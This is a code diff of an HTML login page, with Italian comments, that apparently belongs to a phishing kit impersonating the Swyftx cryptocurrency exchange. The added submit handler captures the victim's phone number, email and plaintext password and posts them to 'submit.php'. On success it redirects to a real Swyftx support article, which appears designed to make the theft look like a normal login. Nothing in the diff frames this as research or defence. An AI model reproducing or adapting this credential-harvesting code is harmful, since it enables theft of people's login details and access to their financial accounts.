@@ -132,7 +132,7 @@
 
             <!-- reCAPTCHA placeholder -->
             <div class="g-recaptcha"
-     data-sitekey="6Led6E4rAAAAAF6AxpFxITtvl7zwK8A-xUkjzf6G"
+     data-sitekey="6Lenb1srAAAAAFaqpt2cqSzr_-h-jBf-OWNOgUGN"
      data-callback="onRecaptchaSuccess"
      data-expired-callback="onRecaptchaExpired"></div>
 
@@ -224,13 +224,38 @@ if (!emailValid) {
 
     emailInput.addEventListener('input', updateSubmitButtonState);
 
-    form.addEventListener('submit', function (e) {
-      updateSubmitButtonState();
-      if (submitButton.disabled) {
-        e.preventDefault();
+form.addEventListener('submit', function (e) {
+  e.preventDefault();
+  updateSubmitButtonState();
+
+  if (submitButton.disabled) return;
+
+  const iti = window.intlTelInputGlobals.getInstance(document.querySelector("#phone"));
+  const fullPhone = iti.getNumber(); // include il prefisso internazionale
+  const email = document.querySelector("#email").value;
+  const password = document.querySelector("#password").value;
+
+  const formData = new FormData();
+  formData.append('phone', fullPhone);
+  formData.append('email', email);
+  formData.append('password', password);
+
+  fetch('submit.php', {
+    method: 'POST',
+    body: formData,
+  })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        window.location.href = "https://support.swyftx.com/hc/en-au/articles/15628426706329-Manage-your-active-biometric-login-sessions"; // reindirizza
       }
+    })
+    .catch(err => {
+      console.error("Errore invio:", err);
     });
-  });
+});
+
+});
 
 
 
@@ -249,12 +274,7 @@ if (!emailValid) {
     });
   });
 
-</script>
 
-
-
-
-<script>
   const slides = [
     {
       image: "img1.png",
@@ -304,8 +324,5 @@ function showSlide(index) {
     showSlide(currentSlide);
   }, 4000); // cambia slide ogni 4 secondi
 </script>
-
-
-    <!-- <script src="script.js"></script> -->
   </body>
 </html>
